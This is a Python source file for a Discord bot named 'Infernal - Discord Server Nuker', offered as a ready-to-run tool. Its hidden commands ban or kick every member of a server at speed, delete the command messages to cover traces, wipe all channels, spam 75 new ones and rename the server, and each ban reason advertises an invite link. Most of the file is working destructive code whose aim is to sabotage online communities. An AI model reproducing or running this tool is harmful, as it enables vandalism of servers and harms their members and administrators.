import discord
import asyncio
import threading
import concurrent.futures
import fade
import os
import time 
import colorama
import ctypes
from colorama import Fore, Back, Style
from discord.ext import commands
from discord import Forbidden, HTTPException

intents = discord.Intents.default()
intents.members = True 
intents.message_content = True  

colorama.init(autoreset=True)

ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

bot = commands.Bot(command_prefix='$', intents=intents)
text_art = """    
                                      
   ██▓ ███▄    █   █████▒▓█████  ██▀███   ███▄    █  ▄▄▄       ██▓    
  ▓██▒ ██ ▀█   █ ▓██   ▒ ▓█   ▀ ▓██ ▒ ██▒ ██ ▀█   █ ▒████▄    ▓██▒            !banall !kickall
  ▒██▒▓██  ▀█ ██▒▒████ ░ ▒███   ▓██ ░▄█ ▒▓██  ▀█ ██▒▒██  ▀█▄  ▒██░      !removechannels !servername
  ░██░▓██▒  ▐▌██▒░▓█▒  ░ ▒▓█  ▄ ▒██▀▀█▄  ▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██░          !createchannels [name]
  ░██░▒██░   ▓██░░▒█░    ░▒████▒░██▓ ▒██▒▒██░   ▓██░ ▓█   ▓██▒░██████▒
  ░▓  ░ ▒░   ▒ ▒  ▒ ░    ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒░▓  ░   ifs?
   ▒ ░░ ░░   ░ ▒░ ░       ░ ░  ░  ░▒ ░ ▒░░ ░░   ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░   
   ▒ ░   ░   ░ ░  ░ ░       ░     ░░   ░    ░   ░ ░    
    ░   ▒     ░ ░   
   ░           ░            ░  ░   ░              ░       ░  ░    ░  ░
                                                                    
                                                       
"""                                 
artlol = fade.blackwhite(text_art)

current_time = ""

def update_time():
    global current_time
    while True:
        t = time.localtime()
        current_time = time.strftime("%H:%M:%S", t)
        time.sleep(1)

time_thread = threading.Thread(target=update_time)
time_thread.daemon = True
time_thread.start()


time.sleep(1)

print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Initializing Bot..")           

@bot.event
async def on_ready():
    print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] {bot.user} has connected to Discord!')
    os.system('cls')
    print(artlol)

token = input(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] Token > ")
intensity = input(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] Speed 1/10 (5 is reccomended , over might {Fore.RED}suspend{Fore.RESET} your token) > ')
channelintensity = int(intensity)
banintensity = float(intensity) * 0.25



@bot.command(name='banall', hidden=True)
async def ban_all(ctx):
    await ctx.message.delete()
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Banning') 
    tasks = []
    for member in ctx.guild.members:
        task = asyncio.create_task(ban_member(ctx, member, reason='Infernal https://discord.gg/2sZcY3tyns', delete_message_days=0))
        tasks.append(task)
    await asyncio.gather(*tasks, limit=banintensity, return_exceptions=True) #banintensity is a place holder for how many concurrent tasks will be running

async def ban_member(ctx, member, reason, delete_message_days, retries=3):
    for attempt in range(retries):
        try:
            await ctx.guild.ban(member, reason=reason, delete_message_days=delete_message_days)
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Banned {member.id} ({member.name}#{member.discriminator})")
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (no permission to ban)")
            return
        except discord.HTTPException as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Error banning {member.id} ({member.name}#{member.discriminator}) (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}]  [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (all retries failed)")

@bot.command(name='kickall', hidden=True)
async def kick_all(ctx):
    await ctx.message.delete() 
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Kicking')
    tasks = []
    for member in ctx.guild.members:
        task = asyncio.create_task(kick_member(ctx, member, reason='Infernal https://discord.gg/2sZcY3tyns'))
        tasks.append(task)
    await asyncio.gather(*tasks, limit=10, return_exceptions=True)
    ctypes.windll.kernel32.SetConsoleTitleW('Infernal - Discord Server Nuker')

async def kick_member(ctx, member, reason, retries=3):
    for attempt in range(retries):
        try:
            await member.kick(reason=reason)
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Kicked {member.id} ({member.name}#{member.discriminator})")
            return
        except discord.Forbidden:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (no permission to kick)")
            return
        except discord.HTTPException as e:
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Error kicking {member.id} ({member.name}#{member.discriminator}) (attempt {attempt+1}/{retries})")
            await asyncio.sleep(1)
    print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}]  [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Skipping {member.id} ({member.name}#{member.discriminator}) (all retries failed)")

@bot.command(name='removechannels')
@commands.has_permissions(manage_channels=True)
async def remove_all_channels(ctx):
    channels = await ctx.guild.fetch_channels()
    tasks = []

    for channel in channels:
        task = channel.delete()
        tasks.append(task)
        print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.RED}-{Fore.RESET}] Deleting channel: {channel.name}")

    tasks_chunked = [tasks[i:i+channelintensity] for i in range(0, len(tasks), channelintensity)]

    for chunk in tasks_chunked:
        await asyncio.gather(*chunk, return_exceptions=True)


@bot.command(name='createchannels')
async def create_channels(ctx, channel_name: str):
    tasks = []
    semaphore = asyncio.Semaphore(channelintensity)

    async def create_channel(i):
        async with semaphore:
            channel = await ctx.guild.create_text_channel(f"{channel_name}-{i}")
            print(f"[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Channel has been made: {channel_name}-{i}")

    for i in range(1, 76):  # 75 channels
        task = create_channel(i)
        tasks.append(task)

    await asyncio.gather(*tasks)

@bot.command(name='servername', hidden=True)
async def change_server_name(ctx):
    await ctx.message.delete()  
    server = ctx.guild
    new_name = input(' Server Name > ')
    try:
        await server.edit(name=new_name)
        print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.GREEN}+{Fore.RESET}] Server name changed to {new_name}')
    except discord.Forbidden:
        print(f'[{Fore.LIGHTBLACK_EX}{current_time}{Fore.RESET}] [{Fore.LIGHTBLACK_EX}~{Fore.RESET}] Failed to change server name (no permission)')

#Add your token into here
bot.run(token, log_handler=None)
